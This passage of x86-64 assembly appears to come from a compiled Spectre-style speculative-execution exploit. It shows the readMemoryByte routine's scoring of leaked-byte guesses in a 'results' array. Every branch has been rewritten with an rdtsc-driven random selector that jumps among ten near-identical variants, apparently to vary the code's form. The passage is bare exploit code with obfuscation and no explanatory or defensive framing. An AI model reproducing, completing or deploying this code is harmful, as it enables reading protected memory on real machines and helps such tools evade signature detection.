	jmp	.LreadMemoryByte_win6_continue
## Variant 5
.LreadMemoryByte_win6_var5:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 6
.LreadMemoryByte_win6_var6:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 7
.LreadMemoryByte_win6_var7:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 8
.LreadMemoryByte_win6_var8:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
## Variant 9
.LreadMemoryByte_win6_var9:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	%eax, -84(%rbp)
	je	.L17
	lfence
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	jmp	.LreadMemoryByte_win6_continue
.LreadMemoryByte_win6_continue:
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	%ecx, (%rdx,%rax)
.L17:
	addl	$1, -96(%rbp)
.L14:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win5_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win5_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win5_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win5_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win5_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win5_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win5_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win5_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win5_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win5_var9
	jmp	.LreadMemoryByte_win5_var0
## Variant 0
.LreadMemoryByte_win5_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	$255, -96(%rbp)
	jle	.L18
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 1
.LreadMemoryByte_win5_var1:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 2
.LreadMemoryByte_win5_var2:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 3
.LreadMemoryByte_win5_var3:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 4
.LreadMemoryByte_win5_var4:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 5
.LreadMemoryByte_win5_var5:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 6
.LreadMemoryByte_win5_var6:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 7
.LreadMemoryByte_win5_var7:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 8
.LreadMemoryByte_win5_var8:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
## Variant 9
.LreadMemoryByte_win5_var9:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L18
	lfence
	movl	$-1, -88(%rbp)
	movl	-88(%rbp), %eax
	movl	%eax, -92(%rbp)
	movl	$0, -96(%rbp)
	jmp	.LreadMemoryByte_win5_continue
.LreadMemoryByte_win5_continue:
	jmp	.L19
.L24:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win4_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win4_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win4_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win4_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win4_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win4_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win4_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win4_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win4_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win4_var9
	jmp	.LreadMemoryByte_win4_var0
## Variant 0
.LreadMemoryByte_win4_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	$0, -92(%rbp)
	js	.L20
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 1
.LreadMemoryByte_win4_var1:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 2
.LreadMemoryByte_win4_var2:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 3
.LreadMemoryByte_win4_var3:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 4
.LreadMemoryByte_win4_var4:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 5
.LreadMemoryByte_win4_var5:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 6
.LreadMemoryByte_win4_var6:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 7
.LreadMemoryByte_win4_var7:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 8
.LreadMemoryByte_win4_var8:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
## Variant 9
.LreadMemoryByte_win4_var9:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -92(%rbp)
	js	.L20
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-92(%rbp), %eax
	jmp	.LreadMemoryByte_win4_continue
.LreadMemoryByte_win4_continue:
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.0(%rip), %rax
	movl	(%rcx,%rax), %eax
	cmpl	%eax, %edx
	jl	.L21
.L20:
	movl	-92(%rbp), %eax
	movl	%eax, -88(%rbp)
	movl	-96(%rbp), %eax
	movl	%eax, -92(%rbp)
	jmp	.L22
.L21:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win3_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win3_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win3_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win3_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win3_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win3_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win3_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win3_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win3_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win3_var9
	jmp	.LreadMemoryByte_win3_var0
## Variant 0
.LreadMemoryByte_win3_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	$0, -88(%rbp)
	js	.L23
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 1
.LreadMemoryByte_win3_var1:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 2
.LreadMemoryByte_win3_var2:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 3
.LreadMemoryByte_win3_var3:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 4
.LreadMemoryByte_win3_var4:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 5
.LreadMemoryByte_win3_var5:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 6
.LreadMemoryByte_win3_var6:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 7
.LreadMemoryByte_win3_var7:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 8
.LreadMemoryByte_win3_var8:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
## Variant 9
.LreadMemoryByte_win3_var9:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$0, -88(%rbp)
	js	.L23
	lfence
	movl	-96(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-88(%rbp), %eax
	jmp	.LreadMemoryByte_win3_continue
.LreadMemoryByte_win3_continue:
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.0(%rip), %rax
	movl	(%rcx,%rax), %eax
	cmpl	%eax, %edx
	jl	.L22
.L23:
	movl	-96(%rbp), %eax
	movl	%eax, -88(%rbp)
.L22:
	addl	$1, -96(%rbp)
.L19:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win2_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win2_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win2_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win2_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win2_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win2_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win2_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win2_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win2_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win2_var9
	jmp	.LreadMemoryByte_win2_var0
## Variant 0
.LreadMemoryByte_win2_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	$255, -96(%rbp)
	jle	.L24
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 1
.LreadMemoryByte_win2_var1:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 2
.LreadMemoryByte_win2_var2:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 3
.LreadMemoryByte_win2_var3:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 4
.LreadMemoryByte_win2_var4:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 5
.LreadMemoryByte_win2_var5:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 6
.LreadMemoryByte_win2_var6:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 7
.LreadMemoryByte_win2_var7:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 8
.LreadMemoryByte_win2_var8:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
## Variant 9
.LreadMemoryByte_win2_var9:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L24
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win2_continue
.LreadMemoryByte_win2_continue:
	addl	$2, %eax
	leal	(%rax,%rax), %ecx
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win1_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win1_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win1_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win1_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win1_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win1_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win1_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win1_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win1_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win1_var9
	jmp	.LreadMemoryByte_win1_var0
## Variant 0
.LreadMemoryByte_win1_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	%eax, %ecx
	jl	.L25
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 1
.LreadMemoryByte_win1_var1:
	popq	%rax
	addq	$32, %rsp
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 2
.LreadMemoryByte_win1_var2:
	popq	%rax
	addq	$32, %rsp
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 3
.LreadMemoryByte_win1_var3:
	popq	%rax
	addq	$32, %rsp
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 4
.LreadMemoryByte_win1_var4:
	popq	%rax
	addq	$32, %rsp
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 5
.LreadMemoryByte_win1_var5:
	popq	%rax
	addq	$32, %rsp
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 6
.LreadMemoryByte_win1_var6:
	popq	%rax
	addq	$32, %rsp
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 7
.LreadMemoryByte_win1_var7:
	popq	%rax
	addq	$32, %rsp
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 8
.LreadMemoryByte_win1_var8:
	popq	%rax
	addq	$32, %rsp
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
## Variant 9
.LreadMemoryByte_win1_var9:
	popq	%rax
	addq	$32, %rsp
	cmpl	%eax, %ecx
	jl	.L25
	lfence
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win1_continue
.LreadMemoryByte_win1_continue:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win0_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win0_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win0_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win0_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win0_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win0_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win0_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win0_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win0_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win0_var9
	jmp	.LreadMemoryByte_win0_var0
## Variant 0
.LreadMemoryByte_win0_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	$2, %eax
	jne	.L26
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 1
.LreadMemoryByte_win0_var1:
	popq	%rax
	addq	$32, %rsp
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 2
.LreadMemoryByte_win0_var2:
	popq	%rax
	addq	$32, %rsp
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 3
.LreadMemoryByte_win0_var3:
	popq	%rax
	addq	$32, %rsp
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 4
.LreadMemoryByte_win0_var4:
	popq	%rax
	addq	$32, %rsp
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 5
.LreadMemoryByte_win0_var5:
	popq	%rax
	addq	$32, %rsp
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 6
.LreadMemoryByte_win0_var6:
	popq	%rax
	addq	$32, %rsp
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 7
.LreadMemoryByte_win0_var7:
	popq	%rax
	addq	$32, %rsp
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 8
.LreadMemoryByte_win0_var8:
	popq	%rax
	addq	$32, %rsp
	cmpl	$2, %eax
	jne	.L26
	lfence
